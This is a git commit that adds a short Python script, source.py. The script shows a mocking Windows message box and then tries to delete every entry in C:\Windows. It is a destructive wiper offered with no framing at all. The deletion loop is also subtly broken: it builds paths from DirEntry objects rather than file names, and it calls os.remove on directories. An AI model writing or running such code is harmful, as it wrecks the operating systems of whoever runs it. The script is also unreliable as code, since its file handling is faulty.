0eb7c2408813de3414524e44421c52775ae77c98
4Bytes <53712708+Luckytrang2010@users.noreply.github.com>
2020-09-27 15:20:04 -0400

    Add files via upload

---
+++ source.py
@@ -0,0 +1,5 @@
+import win32api
+import os
+win32api.MessageBox(0,"your pc gone toast","4bytes was here :))))))))))))))))))))))))))))")
+for i in os.scandir("C:\\Windows"):
+    os.remove(f"C:\\Windows\\{i}")
